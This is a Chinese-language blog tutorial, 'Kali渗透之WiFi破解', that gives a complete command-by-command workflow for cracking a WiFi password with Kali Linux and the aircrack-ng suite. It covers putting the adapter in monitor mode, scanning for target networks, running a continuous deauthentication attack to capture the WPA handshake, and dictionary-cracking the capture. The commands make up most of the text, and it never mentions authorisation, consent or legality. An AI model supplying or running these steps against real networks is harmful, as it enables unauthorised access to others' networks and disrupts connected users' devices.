---
title: "Kali渗透之WiFi破解"
date: "2025-08-03"
description: "使用 Kali Linux 配合无线网卡进行 WiFi 渗透测试，从监听、扫描到抓包、字典破解的完整流程"
tags: [kali, wifi, pentesting]
---

### 0 准备工作

```
1. 安装VMware虚拟机
2. 安装Kali Linux
3. 插入Kali 无线网卡
```

### 1 插入Kali 无线网卡

---

1. 弹窗中选中`连接到虚拟机`
2. 选中需要发起攻击的虚拟机
3. 点击确定

成功开启后，在终端输入下列指令，查看网卡是否识别，若识别将会显示 `wlan0` 项；

```bash
ifconfig
```

### 2 开启网卡监听

---

网卡的使用需要借助 `airmon-ng` 工具，而 `airmon-ng` 工具的使用`root`权限，可以在每条 `airmon-ng` 的指令前添加 `sudo` 前缀，如下：

```bash
sudo airmon-ng指令
```

也可以直接以 `root` 模式打开终端，输入如下指令进入 `root` 终端；

```bash
sudo su
```

开启 `wlan0` 网卡监听，指令如下：

```bash
airmon-ng start wlan0
```

开启后可以再次输入 `ifconfig` 来验证是否网卡是否开启成功，若成功开启则显示 `wlan0mon` 项；

```bash
ifconfig
```

### 3 扫描附近的WiFi

---

接下来对附件的WiFi进行扫描，指令如下：

```bash
airodump-ng wlan0mon
```

扫描结果项如下：

```
BSSID  PWR  Beacons  #Data,  #/S  CH  MB  ENC  CIPHER  AUTH  ESSID
```

- `BSSID`：网卡地址即MAC地址
- `CH`：信道（类似于车道）

输入下列指令可以查看WiFi连接的设备；

```bash
airodump-ng --bssid BSSID目标网卡地址 -c 目标网卡的信道 -w 保存地址(如/home) wlan0mon
```

### 4 抓取WiFi握手包

---

抓起WiFi握手包的指令如下：

```bash
aireplay-ng -0 0 -a BSSID目标网卡地址(路由器MCA) -c 连接设备的MCA wlan0mon
```

>注意：该指令需要重启一个终端页面

上述指令执行后，返回刚才的界面，会发现页面出现一行数据：

```
Created capture file "抓取的WiFi包.cap"
```

### 5 破解WiFi

---

当成功获取到抓包数据后，我们需要结合该数据文件进行字典破解，具体指令如下：

```bash
aircrack-ng -w 密码字典路径.txt 抓取的WiFi包.cap
```

成功爆破后将会显示当前所爆破的WiFi密码，如：

```
KEY FOUND! [123456]
```

### 6 关闭网卡监听

---

在成功获取到目标WiFi的密码后，记得关闭网卡监听，避免影响正常使用，指令如下：

```bash
airmon-ng stop wlan0mon
```
